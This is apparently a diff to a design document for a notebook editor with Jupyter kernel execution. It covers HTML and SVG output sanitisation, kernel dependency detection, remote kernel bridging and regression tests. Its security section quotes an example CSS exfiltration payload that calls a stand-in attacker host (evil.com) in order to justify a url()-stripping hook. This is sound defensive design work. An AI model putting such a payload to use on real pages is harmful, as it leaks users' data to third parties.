@@ -102,9 +102,9 @@ Key format details:
 | Editor pool — one active Monaco, recycled templates for visible cells | **Single shared Monaco instance** follows focus; static `<pre>` for all other cells | Same pattern, simpler: we don't need a pool since we have only one active editor at a time |
 | Command mode / Edit mode with focus indicator | **Same** — colored left bar for command mode, border + cursor for edit mode | Core UX must match for familiarity |
 | Between-cell "+" insertion bar | **Same** — hover reveals insertion line | Essential for cell insertion workflow |
-| Cell toolbar on hover (run, delete, more) | **Simplified** — delete, type toggle, more menu (no run button since no kernel) | No execution support |
+| Cell toolbar on hover (run, delete, more) | **Same** — run, delete, type toggle, more menu | Run button in gutter (always visible on code cells) + hover toolbar |
 | markdown-it + KaTeX for markdown | Existing `Markdown.tsx` component | Already built, consistent styling, zero new deps |
-| Sandboxed iframe for outputs | DOMPurify-sanitized inline HTML | Simpler; no JS execution in outputs |
+| Sandboxed iframe for outputs | DOMPurify-sanitized inline HTML; SVGs via `<img>` data URI | Simpler; no JS execution in outputs; SVGs fully sandboxed |
 | Cell virtualization (WorkbenchList) | Lazy rendering with IntersectionObserver | Lightweight; no virtual scroll library needed |
 | Notebook-level undo via IUndoRedoService | Custom undo stack for structural operations | Monaco handles per-cell text undo; we handle cell add/delete/move/type |
 | Jupyter kernel via vscode-jupyter extension | Backend `jupyter_client` + WS proxy | Kernel runs as subprocess, backend bridges ZMQ↔WebSocket to frontend |
@@ -230,11 +230,33 @@ orchestrator/kernel/
 
 ### Dependency Changes
 
-**Frontend:** One new dependency — **DOMPurify** (already in the dependency tree via `monaco-editor` override in `package.json`). We import it directly for sanitizing HTML outputs. Reuses Monaco editor, `highlightCode()`, `Markdown` component, and existing CSS design tokens.
+**Frontend:** One new direct dependency — **DOMPurify** (`npm install dompurify @types/dompurify`). Note: DOMPurify exists in `node_modules` today because `monaco-editor` depends on it transitively (we pin the version via `overrides` in `package.json`), but it is **not** currently imported by our frontend code and is tree-shaken out of the bundle. Adding a direct `import DOMPurify from 'dompurify'` will pull ~30KB (min+gzip) into the bundle. Reuses Monaco editor, `highlightCode()`, `Markdown` component, and existing CSS design tokens.
 
-**Backend:** One new dependency — **`jupyter_client`** (`uv add jupyter_client`). This is the official Jupyter library for kernel management and the wire protocol. It depends on `pyzmq` (ZeroMQ bindings) for kernel communication. The actual kernel (e.g., `ipykernel` for Python) must be installed on the host — it is NOT bundled with the orchestrator.
+**Backend: No new dependencies.** The kernel management libraries (`jupyter_client`, `ipykernel`) are **not bundled** with the orchestrator — not as hard dependencies, and not as optional dependencies in `pyproject.toml`. They must be installed independently on each worker host where kernel execution is needed.
 
-**Note on ipykernel availability:** The kernel manager detects available kernels via `jupyter kernelspec list`. If no kernels are found (user hasn't installed `ipykernel`), execution controls are hidden and the notebook editor works in edit-only mode with a subtle banner: "Install a Jupyter kernel (e.g., `pip install ipykernel`) to enable cell execution."
+**Runtime detection strategy:**
+
+```python
+# orchestrator/kernel/manager.py — top of file
+_jupyter_available = False
+try:
+    import jupyter_client  # type: ignore[import-untyped]
+    _jupyter_available = True
+except ImportError:
+    pass
+
+def is_kernel_support_available() -> bool:
+    """Check if jupyter_client is installed on this host."""
+    return _jupyter_available
+```
+
+The kernel manager module can always be imported safely. Only actual kernel operations (`start_kernel()`, `execute()`, etc.) check `_jupyter_available` and raise a clear error if missing. This avoids making `pyzmq` (a native C extension) part of the orchestrator's dependency tree, which would complicate PyInstaller bundling and cross-platform builds.
+
+**Per-host installation:** Each worker host (local or remote) must have its own installation of `jupyter_client` and a kernel (e.g., `ipykernel`). The orchestrator detects availability independently per host:
+- **Local:** `try: import jupyter_client` at runtime
+- **Remote:** RWS checks via `shutil.which('jupyter')` and reports capability in its health response
+
+**Note on ipykernel availability:** The kernel manager detects available kernels via `jupyter kernelspec list`. If no kernels are found (user hasn't installed `ipykernel`), or if `jupyter_client` itself is missing, execution controls are hidden and the notebook editor works in **edit-only mode** with a banner: "Run `pip install jupyter_client ipykernel` on {hostname} to enable cell execution." The hostname is shown because different worker hosts may have different install states.
 
 ---
 
@@ -595,8 +617,8 @@ useEffect(() => {
 
 **MIME type priority** (check in order, render first match):
 1. `image/png`, `image/jpeg`, `image/gif` → `<img src="data:{mime};base64,{data}">`
-2. `image/svg+xml` → sanitized inline SVG via DOMPurify
-3. `text/html` → sanitized HTML via DOMPurify (see Security section)
+2. `image/svg+xml` → `<img src="data:image/svg+xml;base64,{data}">` (sandboxed — see Security section)
+3. `text/html` → sanitized HTML via DOMPurify with CSS `url()` stripping (see Security section)
 4. `text/plain` → `<pre>` with ANSI color support
 5. `application/json` → pretty-printed JSON in `<pre>` with syntax highlighting
 
@@ -932,25 +954,57 @@ When the user first clicks a run button or presses Ctrl+Enter:
 
 For remote sessions (rdev), the kernel must run on the remote host where the notebook files and data live.
 
-**Approach:** Extend the RWS (Remote Worker Server) daemon — which already runs on the remote host and handles file operations — to also manage kernels.
+**Approach:** RWS spawns a **separate helper subprocess** for kernel management. The RWS daemon itself remains stdlib-only (critical invariant — it is base64-encoded and sent to remote hosts, must not import third-party packages).
 
-1. RWS gains a `kernel_start` / `kernel_execute` / `kernel_interrupt` action set
-2. RWS uses `jupyter_client` locally on the remote host (requires `ipykernel` installed there)
-3. Kernel messages are forwarded over the existing RWS TCP connection (JSON-lines, same as file ops)
-4. The backend's `KernelPool` detects remote sessions and delegates to RWS instead of local `jupyter_client`
+**Architecture:**
+
+```
+RWS daemon (stdlib-only)
+  │
+  │  kernel_start action
+  │  ─────────────────▸  subprocess: python -c "from orchestrator_kernel_helper import ..."
+  │                       │
+  │                       │  jupyter_client.KernelManager.start_kernel()
+  │                       │  ──────────────────────────────────────▸  Kernel Process
+  │                       │
+  │  kernel_execute        │
+  │  ─────────────────▸   │  ZMQ execute_request
+  │                       │  ──────────────────────────────────────▸
+  │                       │
+  │  ◂── kernel output    │  ◂── ZMQ iopub messages
+  │      (JSON-lines)     │
+```
+
+**How it works:**
+
+1. RWS receives a `kernel_start` action over its TCP connection
+2. RWS checks `shutil.which('jupyter')` — if not found, returns `{"error": "jupyter not installed", "install_hint": "pip install jupyter_client ipykernel"}`
+3. If available, RWS spawns a long-lived helper subprocess: `python -m orchestrator_kernel_bridge`
+4. The kernel bridge script (deployed alongside the daemon, or inlined as a second base64 payload) uses `jupyter_client` to manage the kernel lifecycle
+5. RWS communicates with the bridge via stdin/stdout JSON-lines (same protocol as RWS↔orchestrator)
+6. Kernel output messages are forwarded through: kernel → ZMQ → bridge → RWS → TCP → orchestrator → WebSocket → frontend
+7. On `kernel_shutdown`, RWS sends SIGTERM to the bridge subprocess, which gracefully shuts down the kernel
+
+**Why a subprocess instead of inline imports:**
+- **Preserves the stdlib-only invariant** — the RWS daemon script (`_rws_daemon.py`) has a hard rule: no third-party imports. Breaking this would require native packages (`pyzmq`) to be pre-installed just to start the daemon, even when no kernel features are used.
+- **Clean failure mode** — if `jupyter_client` isn't installed, the subprocess fails to start and RWS returns a clear error. The daemon itself is unaffected.
+- **Process isolation** — a kernel crash or `pyzmq` segfault can't take down the RWS daemon (which also manages PTY sessions and file operations).
 
 This avoids tunneling ZMQ ports (which uses 5 ports per kernel — stdin, shell, iopub, control, heartbeat). The RWS acts as a single-port bridge.
 
-**Requirement:** `jupyter_client` and `ipykernel` (or the relevant kernel) must be installed on the remote host. The RWS startup script should check for this and log a warning if missing.
+**Requirement:** `jupyter_client` and `ipykernel` (or the relevant kernel) must be installed on the remote host by the user. RWS detects availability via `shutil.which('jupyter')` and reports it in its health/capability response. The orchestrator's `KernelPool` checks this capability before attempting remote kernel operations.
 
 ### Kernel Security Considerations
 
 - **Code execution is inherently dangerous** — the kernel runs arbitrary code with the user's permissions. This is expected and matches Jupyter/VS Code behavior. No sandboxing is applied.
+- **No auto-execution** — opening a `.ipynb` file never runs code. Execution requires an explicit user action (Ctrl+Enter, Shift+Enter, or clicking the Run button). This prevents malicious notebooks from executing on open.
 - **Shell injection: N/A** — we never construct shell commands with kernel inputs. `jupyter_client` handles all kernel subprocess management.
-- **Kernel subprocess isolation:** The kernel runs as a child process of the backend (or RWS). It inherits the user's environment. On shutdown, we send SIGTERM then SIGKILL after 5s timeout.
+- **Kernel name validation** — the `kernel_name` parameter in `POST /kernel/start` is validated against the output of `jupyter kernelspec list` before being passed to `jupyter_client`. Any unrecognized kernel name is rejected with a 400 response. This prevents path traversal or injection into the kernel spec lookup.
+- **Kernel subprocess isolation:** Local kernels run as child processes of the backend. Remote kernels run as children of the RWS kernel bridge subprocess (not the RWS daemon itself — see Remote Kernel Support). All inherit the user's environment. On shutdown, we send SIGTERM then SIGKILL after 5s timeout.
 - **Resource limits:** No CPU/memory limits on kernels (same as running `python` locally). The 500-cell cap limits the scope of "Run All" operations.
 - **Authentication:** Kernel WebSocket requires the same session authentication as terminal WebSocket — it's only accessible from the local machine (CORS-locked origins).
 - **Port allocation:** `jupyter_client` selects random available ports for ZMQ channels. These ports are only bound to localhost (not exposed externally).
+- **Kernel dependency isolation** — `jupyter_client` and `ipykernel` are not bundled with the orchestrator. They must be installed independently on each worker host. The RWS daemon remains stdlib-only; kernel management is delegated to a subprocess. A missing or broken kernel installation cannot affect the orchestrator's core functionality.
 
 ---
 
@@ -1010,7 +1064,7 @@ Add to `_LANGUAGE_MAP`:
 
 Notebook HTML outputs can contain arbitrary HTML from libraries like pandas (`DataFrame.to_html()`), matplotlib, etc. We MUST sanitize before rendering.
 
-**Strategy: DOMPurify with restrictive config.**
+**Strategy: DOMPurify with restrictive config + CSS `url()` stripping.**
 
 ```typescript
 import DOMPurify from 'dompurify'
@@ -1033,21 +1087,44 @@ const NOTEBOOK_PURIFY_CONFIG: DOMPurify.Config = {
   FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form', 'input', 'button', 'a', 'link', 'meta', 'base'],
   FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus'],
 }
+
+// Strip url() from style attributes to prevent CSS data exfiltration
+// (e.g., `background-image: url(https://evil.com/steal?data=...)`)
+DOMPurify.addHook('uponSanitizeAttribute', (node, data) => {
+  if (data.attrName === 'style' && data.attrValue) {
+    data.attrValue = data.attrValue.replace(/url\s*\([^)]*\)/gi, 'url()')
+  }
+})
 ```
 
 **Why this is safe:**
 - No `<script>`, `<iframe>`, event handlers, `<a>` tags
-- `style` allowed (needed for pandas) — DOMPurify blocks dangerous CSS functions
+- `style` allowed (needed for pandas DataFrames) but `url()` values are stripped to prevent CSS-based data exfiltration (`background-image: url(https://evil.com/steal?data=...)`) and UI redressing
 - `<img src>` allowed but DOMPurify blocks `javascript:` URIs
-- SVG additionally stripped of `<foreignObject>`
+
+### SVG Output Sandboxing
+
+SVG is a complex attack surface — even after DOMPurify sanitization, SVG can contain `<use href="...">` for SSRF-like behavior, CSS `@import` for data exfiltration, and `<foreignObject>` for HTML injection.
+
+**Strategy: Render SVGs as `<img>` data URIs instead of inline HTML.** This fully sandboxes SVG — the browser's image decoder strips all scripting, external resource loading, and interactive elements.
+
+```typescript
+// In NotebookOutput.tsx — SVG rendering
+if (mimeType === 'image/svg+xml') {
+  const svgData = btoa(unescape(encodeURIComponent(content)))
+  return <img src={`data:image/svg+xml;base64,${svgData}`} alt="SVG output" />
+}
+```
+
+**Why `<img>` and not inline DOMPurify:** DOMPurify cannot fully neutralize SVG. SVG supports `<use href>`, `<animate>`, CSS `@import`, `xlink:href`, and other vectors that would require a constantly-updated blocklist. The `<img>` tag renders SVG through the browser's image pipeline, which by spec blocks all scripting, external loads, and interactivity. Zero maintenance burden.
 
 ### CSP Compliance
 
-No `unsafe-eval`. Uses `dangerouslySetInnerHTML` only with DOMPurify-sanitized output. No external resource loading from outputs.
+No `unsafe-eval`. Uses `dangerouslySetInnerHTML` only with DOMPurify-sanitized output. No external resource loading from outputs. SVG rendered via `<img>` data URIs, not inline.
 
 ### Base64 Image Safety
 
-Data URIs in `<img>` are safe (decoded as image, not HTML/JS). MIME type validated against allowlist. SVG goes through DOMPurify.
+Data URIs in `<img>` are safe (decoded as image, not HTML/JS). MIME type validated against allowlist (`image/png`, `image/jpeg`, `image/gif`, `image/svg+xml`). SVG is always rendered via `<img>` (never inline), so even malicious SVG is sandboxed.
 
 ### Input Validation
 
@@ -1059,6 +1136,10 @@ Data URIs in `<img>` are safe (decoded as image, not HTML/JS). MIME type validat
 ### Serialization Safety
 
 When saving, the serializer produces valid JSON from our typed data model — no user-controlled strings are interpolated into code. The output goes through `JSON.stringify()` which handles escaping.
+
+### Kernel Name Validation
+
+The `kernel_name` parameter in `POST /kernel/start` must be validated against the known kernelspec list (from `jupyter kernelspec list`) before being passed to `jupyter_client`. This prevents path traversal or injection into the kernel spec lookup. Reject any `kernel_name` not present in the discovered specs with a 400 response.
 
 ---
 
@@ -1267,7 +1348,7 @@ Inherits dark/light automatically via CSS variables. Monaco uses existing `cool-
    - Cell collapse/expand
 6. **`NotebookEditor.tsx`** — Main container with metadata bar, cell list, lazy rendering
 7. **Integration** — Wire into FileViewer, add language mappings
-8. **Install DOMPurify** — `npm install dompurify @types/dompurify`
+8. **Install DOMPurify** — `npm install dompurify @types/dompurify` (adds ~30KB min+gzip to bundle; exists in `node_modules` as a transitive dep of monaco-editor but is not currently imported by our code)
 
 At this point the notebook displays correctly but is read-only.
 
@@ -1314,31 +1395,39 @@ At this point the notebook displays correctly but is read-only.
 
 **Estimated effort: 4-5 days**
 
+**Prerequisite:** `jupyter_client` and `ipykernel` must be installed on the local host by the user. These are NOT bundled — the orchestrator detects them at runtime via `try: import jupyter_client`.
+
 1. **`orchestrator/kernel/manager.py`** — `KernelPool` with start/stop/restart/interrupt
-   - Uses `jupyter_client.KernelManager` for subprocess management
+   - Runtime detection: `try: import jupyter_client` at module level; `is_kernel_support_available()` check
+   - Uses `jupyter_client.KernelManager` for subprocess management (only when available)
+   - Validates `kernel_name` against `jupyter kernelspec list` before passing to `jupyter_client`
    - Async iopub reader task forwards messages to WebSocket clients
    - Heartbeat monitoring detects dead kernels
    - Graceful shutdown on app exit
-   - Tests: mock `jupyter_client`, test lifecycle state transitions
+   - Tests: mock `jupyter_client`, test lifecycle state transitions, test graceful fallback when missing
 2. **`orchestrator/api/routes/kernel.py`** — REST endpoints for specs/start/stop/restart/status
    - Kernelspec detection via `jupyter kernelspec list`
-   - Graceful fallback when jupyter not installed
+   - When `jupyter_client` is not installed: return `{"available": false, "install_hint": "pip install jupyter_client ipykernel"}`
 3. **`/ws/kernel/{session_id}` WebSocket handler** — Execute requests, stream outputs
    - JSON text frames, same auth as `/ws/terminal/{id}`
    - Maps cell_id to iopub parent_msg_id for routing outputs to correct cells
+   - Must integrate with activity tracking (`ws_terminal.py:record_user_input`) — kernel execution counts as user activity
 4. **Frontend `useKernel` hook** — WebSocket connection, message dispatch, kernel status tracking
 5. **Frontend execution UI** — Run buttons (gutter + toolbar), kernel status pill, Shift+Enter / Ctrl+Enter / Alt+Enter, execution count `[*]` animation, output streaming
 6. **Execution keyboard shortcuts** — Ctrl+Enter, Shift+Enter, Alt+Enter, I,I (interrupt), 0,0 (restart)
-7. **Auto-start** — First run triggers kernel start; detect missing jupyter gracefully
+7. **Auto-start** — First run triggers kernel start; detect missing jupyter gracefully with per-host install banner
 
 ### Phase 6 — Remote Kernel Support
 
 **Estimated effort: 3-4 days**
 
-1. **RWS kernel actions** — Extend Remote Worker Server daemon with `kernel_start`/`execute`/`interrupt`/`shutdown`
-2. **Backend delegation** — `KernelPool` detects remote sessions, routes through RWS instead of local `jupyter_client`
-3. **Kernel availability detection** — Check if `jupyter` exists on remote host, show install instructions if not
-4. **Tests** — Mock RWS communication, test remote kernel lifecycle
+**Prerequisite:** `jupyter_client` and `ipykernel` must be installed on the remote host by the user. The RWS daemon itself remains stdlib-only.
+
+1. **RWS kernel bridge subprocess** — Deploy a separate Python script (`orchestrator_kernel_bridge`) alongside the daemon. RWS spawns it as a subprocess for kernel management. Communication via stdin/stdout JSON-lines. The daemon itself does NOT import `jupyter_client`.
+2. **RWS kernel actions** — Add `kernel_start`/`execute`/`interrupt`/`shutdown` action handlers in the daemon that delegate to the bridge subprocess
+3. **Backend delegation** — `KernelPool` detects remote sessions, routes through RWS instead of local `jupyter_client`
+4. **Kernel availability detection** — RWS checks `shutil.which('jupyter')` and reports capability in health response. Show per-host install instructions: "Run `pip install jupyter_client ipykernel` on {hostname} to enable execution."
+5. **Tests** — Mock RWS communication, test remote kernel lifecycle, test graceful failure when jupyter not installed on remote host
 
 ### Phase 7 — Polish & Future
 
@@ -1359,6 +1448,113 @@ At this point the notebook displays correctly but is read-only.
 - **Notebook diffing** — Side-by-side comparison with git
 - **Cell search** — Ctrl+F across all cells
 - **Variable explorer** — Inspect active kernel variables
+
+---
+
+## Regression Mitigation Strategy
+
+The notebook editor integrates with several existing systems (file viewer, tab state, keyboard handling, Monaco lifecycle). This section documents how to avoid breaking existing functionality.
+
+### Keyboard Isolation
+
+The notebook's single-key command-mode shortcuts (J/K/A/B/D/M/Y/Z/Enter/Escape) are the highest regression risk because the app already has global `keydown` handlers on `document`:
+
+- `WorkerDetail.tsx` — Ctrl+S (save), Ctrl+W (close tab), Ctrl+Shift+E (toggle explorer)
+- `WorkerWorkspace.tsx` — Cmd+Shift+[/] (tab switch), Cmd+\ (toggle split)
+- `FileExplorerPanel.tsx` — Arrow keys, Enter, `/` (open filter), Escape
+
+**Required implementation rules:**
+
+1. The notebook `onKeyDown` handler is attached to the notebook container `<div>`, NOT to `document`
+2. All consumed keys call `event.stopPropagation()` to prevent bubbling to document-level handlers
+3. Command-mode keys only activate when `document.activeElement` is inside the notebook container (check via `containerRef.current?.contains(document.activeElement)`)
+4. In edit mode (Monaco active), only Escape, Ctrl+S, and execution shortcuts (Ctrl+Enter, Shift+Enter, Alt+Enter) are intercepted — everything else goes to Monaco
+5. Double-tap shortcuts (DD, II, 00) must verify the first keypress target is within the notebook before starting the timer window
+
+### Monaco Multi-Instance Safety
+
+This is the first time the app will have two concurrent Monaco editor instances (FileViewer's + NotebookEditor's). Both share the global `monaco` namespace from `loader.init()`.
+
+**Required implementation rules:**
+
+1. Each editor uses its own `ITextModel` instance — never reuse models across FileViewer and NotebookEditor
+2. Theme definitions (`cool-dark`, `cool-light`) are global and shared — this is fine, do not define duplicate themes
+3. When the notebook editor calls `model.setValue()` during cell focus changes, it triggers `onDidChangeModelContent`. Guard with an `isSettingValue` ref flag to distinguish programmatic updates from user typing:
+   ```typescript
+   const isSettingValue = useRef(false)
+   // When changing cells:
+   isSettingValue.current = true
+   model.setValue(newCellSource)
+   isSettingValue.current = false
+   // In onChange handler:
+   editor.onDidChangeModelContent(() => {
+     if (isSettingValue.current) return
+     dispatch({ type: 'UPDATE_CELL_SOURCE', ... })
+   })
+   ```
+4. When a `.ipynb` tab is not active (user switched to a `.py` tab), the notebook's Monaco instance must not call `editor.layout()` or `editor.focus()` — these would interfere with the active editor
+
+### External Change Detection for Notebooks
+
+The tab system polls file mtime every 3s (`useEditorTabs.ts:275-327`). For clean tabs, it silently reloads content via `fetchTabContent`. This is **dangerous for notebooks** because:
+
+- `fetchTabContent` replaces `originalContent` AND `currentContent` in the tab state
+- The NotebookEditor maintains parsed cell state in React state, independent of `currentContent`
+- A silent reload would desync the NotebookEditor's state from the tab's content
+
+**Required implementation rules:**
+
+1. For `.ipynb` tabs, mtime changes must **never** trigger a silent `fetchTabContent` reload
+2. Instead, mtime changes set `externallyChanged: true`, showing the "file changed on disk" banner
+3. The NotebookEditor handles the "reload" action by re-parsing the new JSON and merging cell-level changes (or replacing entirely if the user confirms)
+4. While a kernel is running for this notebook, consider suppressing mtime polling entirely (kernel execution may write outputs to the file)
+
+### Round-Trip Serializer Fidelity
+
+The tab system detects dirty state via `originalContent !== currentContent` (string equality). For notebooks, `currentContent` is the serialized JSON from `notebookSerializer.ts`. If the serializer produces different output than the original (different whitespace, key ordering), the tab shows dirty immediately on open.
+
+**Required implementation rules:**
+
+1. The serializer must detect and reproduce the original file's indentation (1 space, 2 space, 4 space, tab)
+2. JSON keys must be sorted alphabetically (minimizes diff noise and ensures deterministic output)
+3. Source line splitting must produce byte-identical output for unmodified cells
+4. **Critical test:** parse an unmodified notebook → serialize → compare with original bytes. Any difference is a bug. Run this against 10+ real-world notebooks (pandas docs, scikit-learn, matplotlib gallery).
+
+### CSS Output Scoping
+
+Notebook HTML outputs (from pandas, matplotlib, seaborn) contain their own CSS class names that could collide with app styles. App CSS could also bleed into output rendering.
+
+**Required implementation rules:**
+
+1. Wrap all notebook HTML output in a container with CSS isolation:
+   ```css
+   .nb-cell__outputs__html {
+     all: initial;          /* reset inherited app styles */
+     font-family: inherit;  /* restore base font */
+     font-size: inherit;
+     color: inherit;
+   }
+   ```
+2. Notebook CSS classes use the `nb-` prefix exclusively — verify no collisions with `fe-` (file explorer), `monaco-` (editor), or `xterm-` (terminal) prefixes
+
+### Required Regression Test Suite
+
+Before shipping each phase, run these integration tests:
+
+**Phase 1-2 (rendering + editing):**
+- Open `.py` tab → open `.ipynb` tab → switch between them 10× rapidly → verify no Monaco crashes, no language bleed, no stale content
+- Focus file explorer → press J/K → verify tree navigation works (not notebook)
+- Focus notebook cell → press J/K → verify cell navigation works (not tree)
+- Focus terminal → type J/K → verify terminal receives input (not intercepted)
+- Open `.ipynb` → make no edits → verify dirty flag is false
+- Open `.ipynb` → edit one cell → undo → verify dirty flag returns to false
+- Modify `.ipynb` on disk while open in editor → verify external change banner appears (no silent reload)
+
+**Phase 5 (kernel execution):**
+- Open notebook + terminal side by side → execute cell → verify terminal remains responsive
+- Execute cell → close notebook tab → verify kernel is shut down (no orphan process)
+- Disconnect network (remote session) → verify kernel shutdown is graceful, no zombie processes
+- Open notebook → click Run without jupyter installed → verify install banner appears, no crash
 
 ---
 
@@ -1416,21 +1612,35 @@ At this point the notebook displays correctly but is read-only.
 
 ## Risks & Mitigations
 
+### Feature-Internal Risks
+
 | Risk | Likelihood | Impact | Mitigation |
 |---|---|---|---|
-| XSS via HTML outputs | Medium | High | DOMPurify with restrictive allowlist |
+| XSS via HTML outputs | Medium | High | DOMPurify with restrictive allowlist + CSS `url()` stripping hook |
+| CSS data exfiltration via `style` attribute | Medium | High | DOMPurify hook strips `url()` values from inline styles (see Security section) |
+| SVG with embedded scripts | Medium | High | SVGs rendered via `<img>` data URI (fully sandboxed), never inline HTML |
+| Round-trip data loss (outputs, metadata) | Medium | High | Store raw original objects; parse→serialize→parse round-trip tests against real-world notebooks |
 | Monaco mount/unmount flicker | Medium | Medium | Match font metrics exactly; batch DOM operations in `requestAnimationFrame` |
 | Height jump on cell focus change | Medium | Medium | Static `<pre>` and Monaco use identical padding/font/line-height |
-| Round-trip data loss (outputs, metadata) | Medium | High | Store raw original objects; serialize test that parse→serialize→parse === original |
 | Memory spike on huge notebooks | Low | Medium | 500-cell cap, lazy rendering, single Monaco |
-| SVG with embedded scripts | Medium | High | DOMPurify strips scripts + `<foreignObject>` |
 | Undo stack loses sync with cell state | Low | Medium | Undo stack stores full cell snapshots (not diffs) |
-| Keyboard shortcut conflicts with app | Low | Low | Shortcuts only active when notebook container has focus; scoped via `onKeyDown` |
 | Kernel subprocess leak (not cleaned up) | Medium | Medium | Shutdown hook in app lifespan; SIGTERM then SIGKILL after 5s; track PIDs |
 | Kernel dies mid-execution | Medium | Low | Heartbeat monitoring; "Kernel died — Restart?" banner; outputs from partial execution preserved |
-| jupyter_client not installed | High | Low | Graceful degradation: edit-only mode, hide run buttons, show install instructions |
-| ZMQ port exhaustion on remote hosts | Low | Low | RWS bridges all kernel comms over single TCP port; no ZMQ port forwarding needed |
+| jupyter_client not installed | High | Low | Graceful degradation: edit-only mode, hide run buttons, show per-host install instructions |
+| ZMQ port exhaustion on remote hosts | Low | Low | RWS bridges all kernel comms over single TCP port via helper subprocess; no ZMQ port forwarding |
 | Runaway kernel (infinite loop, OOM) | Medium | Medium | Interrupt button (SIGINT); kernel restart; no auto-restart on OOM to avoid loops |
+| Kernel name injection | Low | High | Validate `kernel_name` against `jupyter kernelspec list` before passing to `jupyter_client` |
+
+### Regression Risks (Impact on Existing Features)
+
+| Risk | Likelihood | Impact | Affected Code | Mitigation |
+|---|---|---|---|---|
+| Keyboard shortcut conflicts (J/K/A/B/D/M/Y/Z captured globally) | High | High | `WorkerDetail.tsx:264-287`, `WorkerWorkspace.tsx:155-207`, `FileExplorerPanel.tsx:768-822` | Notebook `onKeyDown` must `stopPropagation()` for all consumed keys. Command-mode keys ONLY activate when notebook container has DOM focus. Add integration tests: press J/K with file explorer focused (tree navigates), with notebook focused (cells navigate), with terminal focused (input goes to terminal). |
+| Monaco multi-instance race conditions | Medium | Medium | `FileViewer.tsx:5-26, 274-302` | Use separate `ITextModel` instances per editor. Guard `model.setValue()` with `isSettingValue` flag to prevent `onDidChangeModelContent` from firing during programmatic updates. Test rapid tab switching between `.py` and `.ipynb` tabs. |
+| External change detection destroys notebook state | Medium | High | `useEditorTabs.ts:275-327` | For `.ipynb` tabs, mtime change must notify NotebookEditor instead of silently reloading via `fetchTabContent` (which replaces `currentContent` and wipes React state). Options: (a) disable mtime polling while kernel is running, (b) diff at cell level on external change, (c) only show banner, never auto-reload. |
+| Tab dirty flag false positive on open | High | Low | `useEditorTabs.ts:668-673` | Serializer must exactly reproduce original formatting for unmodified notebooks (detect indentation, preserve key order). Test: open `.ipynb`, make no edits → dirty flag must be false. |
+| Double-tap shortcuts (DD, II, 00) conflict with global handlers | Low | Medium | `WorkerDetail.tsx:264-287` | First keypress in double-tap sequence must not be consumed by a document-level handler. The notebook's timer-based double-tap window (500ms) must check `event.target` is within the notebook container. |
+| CSS output bleed — notebook HTML outputs affect app styles | Low | Medium | Global CSS, `.nb-cell__outputs` | Add CSS isolation (scoped styles or `all: initial` reset) inside `.nb-cell__outputs` container to prevent pandas/matplotlib class names from matching app selectors, and vice versa. |
 
 ---
 
@@ -1466,8 +1676,8 @@ At this point the notebook displays correctly but is read-only.
 
 3. **Should JSON toggle edits sync back to cell view?** If the user edits raw JSON and toggles back, we'd need to re-parse. **Recommendation:** Yes, but show a confirmation if parsing fails ("Invalid JSON — stay in JSON view?").
 
-4. **Should `jupyter_client` be a hard or optional dependency?** Making it optional means the orchestrator can install without `pyzmq` (which requires native compilation). **Recommendation:** Optional — `try: import jupyter_client` with graceful fallback. Add to `[project.optional-dependencies]` as `notebook = ["jupyter_client>=8.0"]`.
+4. **Should `jupyter_client` be a hard or optional dependency?** ~~Making it optional means the orchestrator can install without `pyzmq` (which requires native compilation). **Recommendation:** Optional — `try: import jupyter_client` with graceful fallback. Add to `[project.optional-dependencies]` as `notebook = ["jupyter_client>=8.0"]`.~~ **Decision: Neither.** `jupyter_client` is not added to `pyproject.toml` at all — not as a hard dependency, not as an optional dependency. It is detected purely at runtime via `try: import jupyter_client`. This keeps `pyzmq` (native C extension) completely out of the orchestrator's dependency tree, avoiding PyInstaller bundling complications. Users install it independently on each worker host.
 
-5. **Should we bundle `ipykernel`?** The orchestrator doesn't need a kernel itself — the user does. **Recommendation:** No. Document the requirement. The kernel spec detection will surface clear guidance when missing.
+5. **Should we bundle `ipykernel`?** The orchestrator doesn't need a kernel itself — the user does. **Decision:** No. Kernel dependencies (`jupyter_client`, `ipykernel`) must be lazy-installed on each worker host independently. The install banner shows per-host instructions when missing.
 
 6. **Should "Run All" continue on error or stop?** Jupyter stops, VS Code stops by default. **Recommendation:** Stop on error (matching both). Add a "Continue on error" option in the toolbar More menu later if requested.
